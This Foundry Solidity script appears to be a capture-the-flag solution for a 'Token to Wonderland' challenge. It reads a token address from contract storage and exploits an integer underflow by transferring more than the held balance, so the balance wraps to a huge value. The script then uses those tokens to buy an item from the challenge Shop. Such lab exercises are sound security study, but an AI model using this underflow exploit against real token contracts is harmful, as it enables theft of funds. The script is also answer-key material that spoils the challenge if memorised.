// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";
import "../src/blockchain_token_to_wonderland/Shop.sol";
import "../src/blockchain_token_to_wonderland/Setup.sol";
import "../src/blockchain_token_to_wonderland/SilverCoin.sol";

contract TokenToWonderlandSolution is Script {
  Shop public level = Shop(payable(0x95CBbEbC1498851874f3425C9A4313934819Ab1C));
  Setup public level_setup = Setup(payable(0x093Dc6d5a27a87D608aBAf0CF1dc495757d00b48));
  address public myAddress = address(0x837B98452dFfd045c8e72F6F38617437cBf1432C);

  function run() external { 
    vm.startBroadcast(vm.envUint("PRIVATE_KEY_TOKEN_TO_WONDERLAND"));
    uint256 slot = 1;
    address silverCoinAddress = address(uint160(uint256(vm.load(address(level), bytes32(slot))))); // get token address
    SilverCoin coin = SilverCoin(silverCoinAddress);
    coin.transfer(address(1), coin.balanceOf(myAddress)+1); //explorando uintUnderflow 
    console.log("My Coin Balance: ", coin.balanceOf(myAddress));
    (,uint256 item2Price,) = level.viewItem(2);
    coin.approve(address(level), item2Price); //aprova o contrato de shop a transferir os tokens que custam o item 2
    level.buyItem(2); //compra item 2
    (,,address item2Owner) = level.viewItem(2);
    console.log("Item 2 Owner: ", item2Owner);

    vm.stopBroadcast();

  }
} 
